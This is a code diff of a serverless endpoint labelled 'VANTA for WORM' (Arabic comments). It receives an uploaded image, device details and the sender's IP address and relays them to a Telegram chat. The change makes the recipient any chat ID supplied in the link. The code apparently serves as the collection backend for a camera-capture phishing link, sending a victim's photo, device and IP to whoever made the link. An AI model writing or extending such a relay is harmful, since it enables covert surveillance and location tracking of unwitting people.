@@ -1,5 +1,5 @@
 // api/send.js — VANTA for WORM
-// يستقبل الصورة، يتحقق من الرمز، يرسلها لصاحب الرمز
+// يستقبل الصورة، يرسلها لصاحب الرابط (Chat ID من الرابط)
 
 export default async function handler(req, res) {
   if (req.method !== 'POST') {
@@ -8,7 +8,6 @@ export default async function handler(req, res) {
   }
 
   const TG_TOKEN = process.env.TG_TOKEN;
-  const CONFIG_URL = process.env.GLOBAL_CONFIG;
   const FALLBACK_CHAT = process.env.TG_CHAT;
 
   if (!TG_TOKEN) {
@@ -22,7 +21,7 @@ export default async function handler(req, res) {
 
     const image  = body && body.image;
     const device = (body && body.device) ? String(body.device).slice(0, 200) : 'غير معروف';
-    const code   = (body && body.code) ? String(body.code).toUpperCase().replace(/[^A-Z0-9]/g,'') : '';
+    const code   = (body && body.code) ? String(body.code).trim() : '';
 
     const m = /^data:image\/(png|jpeg|webp);base64,([A-Za-z0-9+/=]+)$/.exec(image || '');
     if (!m) {
@@ -35,25 +34,15 @@ export default async function handler(req, res) {
                 || req.socket?.remoteAddress || 'unknown';
     const cap = new Date().toISOString();
 
-    // تحديد المستلم
+    // المستلم = Chat ID من الرابط
     let recipient = null;
 
-    if (code && CONFIG_URL) {
-      try {
-        const r = await fetch(CONFIG_URL);
-        const cfg = await r.json();
-        const codes = cfg.codes || {};
-        const entry = codes[code];
-        if (entry && entry.usedBy) {
-          recipient = entry.usedBy;
-        }
-      } catch (e) {}
+    if (code && /^\d+$/.test(code)) {
+      recipient = code;
     }
 
-    // إذا لا يوجد رمز صحيح، أرسل للمالك (fallback)
-    if (!recipient) {
-      recipient = FALLBACK_CHAT;
-    }
+    // إذا لا يوجد، أرسل للمالك (fallback)
+    if (!recipient) recipient = FALLBACK_CHAT;
 
     if (!recipient) {
       res.status(400).json({ ok: false, err: 'no recipient' });
@@ -62,7 +51,6 @@ export default async function handler(req, res) {
 
     const caption =
       '📸 صورة جديدة\n' +
-      (code ? '🔑 الرمز: ' + code + '\n' : '') +
       '📱 ' + device + '\n' +
       '🌐 IP: ' + ip + '\n' +
       '🕐 ' + cap;
@@ -85,4 +73,4 @@ export default async function handler(req, res) {
   } catch (e) {
     res.status(500).json({ ok: false, err: String(e) });
   }
-}
+      }
